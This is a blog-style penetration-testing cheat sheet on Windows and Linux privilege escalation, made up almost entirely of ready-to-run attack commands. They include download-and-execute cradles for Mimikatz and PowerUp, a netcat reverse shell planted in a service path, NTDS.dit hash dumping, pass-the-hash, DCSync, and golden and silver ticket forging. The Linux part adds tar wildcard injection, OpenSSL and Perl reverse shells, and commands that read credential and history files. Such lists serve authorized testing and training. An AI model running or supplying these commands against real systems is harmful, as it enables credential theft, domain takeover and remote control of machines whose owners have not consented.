PrivEsc | Blogs By tobor

# PRIVESC

#### Priviledge Escalation

====================
WINDOWS
====================
**PowerUp:**

IEX(New-Object Net.WebClient).downloadString('<url>/PowerUp.ps1') ;Invoke-AllChecks

**Mimikatz:**

IEX(New-Object Net.WebClient).downloadString('<url>/MimiKatz.ps1') ;Invoke-Mimikatz -DumpCreds

**Unquoted Service Paths:**

wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

**Weak Permissions on Services Registry:**
**1.) Find explpoitable services**
.\accesschk -accepteula -uvwc *
**2.) Change Service ImagePath Value**

cmd /c sc config usosvc binPath="C:\Windows\System32\spool\drivers\color\nc64.exe -e powershell 10.10.14.21 8087"

**3.) Verify That Value**
reg query "HKLM\System\CurrentControlSet\Services\usosvc" /v "ImagePath"
** 4.) Start The Service To Execute Payload**
cmd /c sc stop usosvc
cmd /c sc start usosvc

When a domain controller is compromised we can make a copy or backup of the NTDS.dit file and obtain password hashes of all the domain users.

=================================
**DISKSHADOW NTDS.DIT METHOD**
**=================================**
**This requires backup and restore priviledges**
diskshadow
**set** context persistent nowriters
add volume c**:**  **alias** dmwong
create
expose %dmwong% z**:**

**Now importing the the dll files here**  https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug  **into powershell we can get our backup**

**REOSURCE**: https://github.com/giuliano108/SeBackupPrivilege
**# Import the following dll modules**
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
**# Create the backup and set permissions**
Set-SeBackupPriviledge
Get-SeBackupPriviledge
Copy-FileSeBackupPriviledge Z**:**\Windows\NTDS\ntds.dit C**:**\Temp\ntds.dit
Copy-FileSebackupPrivilege z**:**\Windows\NTDS\ntds.dit c**:**\temp\ndts.dit
reg save hklm\system c**:**\temp\system.bak

**Download ntds.dit to your attack machine and issue the below command to extract the hashes**

python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -ntds ntds.dit -system system.bak LOCAL

=====================================
**VSSADMIN NTDS.DIT EXTRACTION METHOD     **
=====================================

This requires admin rights. If this file is compromised you have password hashes for all the user accounts in the domain.

File is located on domain controllers at C:\Windows\NTDS\ntds.dit

File is always in use by Active Directory. Service would need to be stopped to move the file.

File can also be moved by using shadow copy.
CMD> vssadmin create shadow for 'C:\'

# This creates a copy of entire C Drive. We copy the ntds.dit file out of there to a temp file

CMD> copy \\CopyShadowCopyVolumeNameValueFromAboveOutputAndPlaceHere\Windows\NTDS\ntds.dit C:\Temp\ntds.dit

Everything is encrypted in the dit file with a local system file.
CMD> reg sav HKLM:\SYSTEM C:\Temp\Sys

# This info can be used to decrypt the file

# File was copied while open so we need to repair disk to successfully decrypt database.

CMD> esentutl /p C:\Temp\ntds.dit /!10240 /8 /o
PS> $Key = Get-BootKey -SystemHiveFilePath "C:\temp\SYS"

PS> Get-ADDBAccount -All -BootKey $Key -DbPath "C:\Windows\ntds.dit" | Out-File C:\Temp\UncrackedInfo.txt

============================================

|                                    PASS THE HASH                                     |

============================================

If a user account has admin rights to a system, those rights can be used to view other creds stored in memory.

Those newly found admin creds can than be used to access remote machines.
mimikatz # sekurlsa::logonpasswords

# Find admin accounts to exploit from above output.

# Copy that admins NTLM password hash

NTLM: 13b29964cc2480b4ef454c59562e675c

mimikatz# sekurlsa::pth /user:adminaccount.name /domain:usav.org /ntlm:13b29964cc2480b4ef454c59562e675c

# This starts a command prompt.

# Whoami returns normal user but process is running as admin. This allows access to remote systems as that admin.

# This creates lateral movement.

===================
**Kerberoasting:**
**===================**
To  begin make sure Port 88 is available (port forward if needed).
Make sure your time and timezone and the targets time are in sync,
**View Time In Windows**
tzdate /g
**View Time In Linux**
date
**Obtain a Ticket Hash**
  Import-Module Invoke-Kerberoast.ps1
 Invoke-Kerberoast -ErrorAction SilentlyContinue -OutputFormat hashcat
**Crack the obtained ticket hash using certain rule set**

  hashcat -m 13100 .**/**rosborne **/**usr**/**share**/**wordlists**/**rockyou.txt rules**/**_NSAKEY.v2.dive.rule –debug-mode=1 –debug-file=matched.rule –force -0

**First get SPNs with one of the following techniques:**
**Remote via Impacket:**
GetUserSPNs.py -request -dc-ip <ip> <domain>/<user>
**Local via setspn.exe:**
Add-Type -AssemblyName System.IdentityModel

setspn.exe -T <domain> -Q */* | Select-String '^CN' -Context 0,1 |  % { New-Object System.  IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList  $_.Context.PostContext[0].Trim() }

**Local via Powershell:**
Add-Type -AssemblyName System.IdentityModel

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/<user>.<domain>"

**Local via PowerSploit:**

powershell.exe -Command 'IEX (New-Object Net.Webclient).DownloadString("[http://<ip>:<port>/Invoke-Kerberoast.ps1");Invoke-Kerberoast](http://%3Cip%3E:<port>/Invoke-Kerberoast.ps1) -OutputFormat Hashcat

The result of this step will be the hash of a kerberos ticket. It can directly be cracked with hashcat64.exe -m 13100 roasted.hash <wordlist>.

**Kerberos ticket export oneliner:**

powershell.exe  -exec bypass IEX (New-Object) Net.WebClient).DownloadString('<url to  MimiKatz.ps1>'); Invoke-Mimikatz -Command "kerberos::list /export"

**Juicy Potato (Metasploit) **[**HERE**](http://ohpe.it/juicy-potato/)
use windows/local/ms16_075_reflection_juicy`
set SESSION <>
set CLSID <>
**PowerView:**
All kinds of useful domain related commands.
**List Domain Users With PowerView:**
Get-DomainUser -Credential $cred -DomainController <dc>

Get-DomainUser -Credential $cred -DomainController <dc> | select samAccountName, logoncount, lastlogon

=====================================

|                             DCSYNC ATTACK                            |

=====================================
Can be performed without performing any logon to Domain Controllers
mimikatz.exe
mimikatz # lsadump::dcsync /domain:osbornepro.com /user:krbtgt

# The above account can be used to get Golden Tickets

==============================

|                GOLDEN TICKET RECIPE               |

==============================
{{{{FIRST PIECE OF INFO NEEDED}}}}
DOMAIN      : osbornepro.com

# This is of course the domain you are in

{{{{SECOND PIECE OF INFO NEEDED}}}}
DOMAIN SID  : <sid number>

# Whlie logged onto a domain computer issue the below command and leave off the last five digits

PS> whoami /user
USER INFORMATION
----------------
User Name    SID
============ ==============================================
osbornepro/derp S-1-5-21-<sid number>
{{{{THIRD PIECE OF INFO NEEDED}}}}}
KRBTGT      : <ticket hash>

# Password Hash, need to be Domain Admin to get this

# Issue below commands as DC admin in mimikatz.

mimikatz # lsadump::dcsync /osbornepro:hostFQDN.osbornepro.com /user:krbtgt

Copy the "Hash NTLM" password line hash in the "Credentials" section and that is the KRBTGT value we need.

******************************************
GRANT YOURSELF THE GOLDEN TICKET
******************************************

mimikatz # kerberos::golden /domain:osbornepro.com /sid:<sid number> /rc4:a49e8edf15676c64e31878a59d2bc319 /id:500 /user:TrustMeImAdmin

# The /id siwthc value o 500 is for admin accounts. Specify name of the user in the /user field. I believe this can be anything you want.

# Golden ticket will be saved as file ticket.kirbi

*****************************************************
USE TICKET WITH KERBEROS PASS THE TICKET COMMAND
*****************************************************
mimikatz # kerberos::ptt ticket.kirbi

# The above loads ticket into memory.

# open a cmd prompt. Whoami returns normal user but process runs as admin. This allows Domain Admin access to a domain controller. Ticket doesnt expire basically ever.

================================

|                       SILVER TICKETS                       |

================================
NOTE: See golden ticket if you have trouble getting any info

Allows attacker to create forge TGS tickets that give an attacker access to a particular service on a particular server

No special priviledges required to do this. Can be done by any user and does not require any communication with a Domain Controller.

All that is needed is a password for a service account.
1.) KERBEROAST
PS> Add-Type -AssemblyName System.IdentityModel

PS> New-Object -TypeName System.IdentityModel.Tokens.KerberosRequestForSecurityToken -ArgumentList "MSSQLsvc/

mimikatz.exe
kerberos::list /export

Python ./tgsrepcrack.py wordlist.txt 1-00a10000-admin@MSSQLSvc~desktop.osbornepro.com~1433-osbornepro.com.kirbi

2.) CONVERT TO NTLM
PS> Import-Module DSInternals
PS> $Pwd = ConvertTo-SecureString <password>-AsPlainText -Force
PS> ConvertTo-NTHash $Pwd
<hash value>
PS> whoami /user
USER INFORMATION
----------------
User Name    SID
============ ==============================================
osbornepro/derp S-1-5-21<sid number>
3.) SILVER TICKET

mimikatz # kerberos::golden /domain:usav.org /sid:<sid number> /ptt /target:sqlserviceOnServer.osbornepro.com:1433 /service:MSSQLSvc /rc4:<hash value> /id:1103 /user:IveGotASilverTicket

# This can be used to join groups to elevate privledges

CMD> klist

# The above command will show your bogus tickets.

sqlcmd -S ServerWithSqlService.usav.org
SELECT SYSTEM_USER;
GO
====================
**LINUX**
====================
**Abusing Common Tools**
A nice collection of abusable tools can be found at GTFOBins.
https://gtfobins.github.io/
**Abusing Tar**

If  tar is allowed in sudoers with a wildcard command we can abuse that for  privilege escalation. Filenames will be interpreted as command line  arguments therefore we can create the following setup:

Create these files in the directory
-rw-r–r–. 1 xxx xxx 0 Oct 28 19:19 –checkpoint=1
-rw-r–r–. 1 xxx xxx 0 Oct 28 19:17 –checkpoint-action=exec=sh payload.sh
-rwxr-xr-x. 1 xxx xxx 12 Oct 28 19:17 payload.sh
To create the files use:
echo "chmod u+s /usr/bin/find" > payload.sh
echo "" > "--checkpoint-action=exec=sh payload.sh"
echo "" > --checkpoint=1

Using find as the payload has the charm that we can execute commands via find f1 -exec "whoami" \; (file f1 must exist)

**Abusing TCPDump**
With -z you can execute commands via TCPDump.
**Abusing OpenSSL**

Openssl  can read files and write into files via network. So it can be used for  exfil and infil of Data. In addition a bind or reverse shell can be  implemented via OpenSSL, e.g.:

openssl.exe  s_client -quiet -connect <ip>:<port> | cmd.exe |  openssl.exe s_client -quiet -connect <ip>:<port>`

**Rsync**

If permissions allow it one can get RCE with RSync by overwriting the cronjobs file.

*  * * * * root perl -e 'use  Socket;$i="<ip>";$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh  -i");};

**NFS Shares**

When  mounting nfs-shares with mount <ip>:/<path> <folder>  you can impersonate users by running the command with a local user that  has the uid you want to use on target box, as it just matches the uids  when checking for permissions.

Interesting Reads
    Privilege escalation using LD_PRELOAD
    Linux privilege escalation using shared libraries
    Abusing Shared Libraries
**Determine Linux Distribution and Version    **
**For Finding Kernel Exploits**
cat /etc/issue
 cat /etc/*-release
cat /etc/lsb-release
cat /etc/redhat-release
**Determine Kernel Version**
cat /proc/version
uname -a
uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz-
**Get Environment Variables**
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set
printenv <env name>
**Get Running Services**
ps aux
ps -ef
top
htop
cat /etc/service
**Root Services**
ps aux | grep root
ps -ef | grep root
**Installed Applications**
ls -alh /usr/bin/
ls -alh /sbin/
dpkg -l
apt list --installed
rpm -qa
ls -alh /var/cache/apt/archivesO
ls -alh /var/cache/yum/
**Syslog Configuration**
cat /etc/syslog.conf
cat /var/log/syslog.conf
(or just: locate syslog.conf)
**Web Server Configs**
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/apache2/apache2.conf
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
**PHP Configuration **
/etc/php5/apache2/php.ini
**Printer (cupsd) Configuration  **
cat /etc/cups/cupsd.conf
**MySql **
cat /etc/my.conf
**Inetd Configuration   **
cat /etc/inetd.conf
**List All **
ls -aRl /etc/ | awk '$1 ~ /^.*r.*/'
**Determine Scheduled Jobs **
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*   cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
**Locate Any Plaintext Usernames and Passwords **
grep -i user [filename]
grep -i pass [filename]
grep -C 5 "password" [filename]
find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"
**Identify Connected Users and Hosts  **
lsof -i
lsof -i :80
ss -ant
ss -anl
grep 80 /etc/services
netstat -antup
netstat -antpx
netstat -tulpn
chkconfig --list
chkconfig --list | grep 3:on
last
w
**Check For Ports Open for Local Only Connections   **
netstat -tupan
ss -anlt
**Check User History for Credentials and Activity **
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history
**Check User Profile and Mail  **
cat ~/.bashrc
cat ~/.profile
cat /var/mail/root
cat /var/spool/mail/root
**Finding Exploit Code  **
/pentest/exploits/exploitdb/searchsploit "kernel"  | grep -i "root"
cat /pentest/exploits/exploitdb/files.csv |grep -i privile
grep -i X.X /pentest/exploits/exploitdb/files.csv | grep -i local
grep -i application /pentest/exploits/exploitdb/files.csv | grep -i local
**Check Development**  **Environment on Target Hosts **
find / -name perl*
find / -name python*   find / -name gcc*
find / -name cc
**How Can Files Be Uploaded?   **
find / -name wget
find / -name nc*
find / -name netcat*
find / -name tftp*    find / -name ftp

# If port 22 is open, use srvdir for SSH egress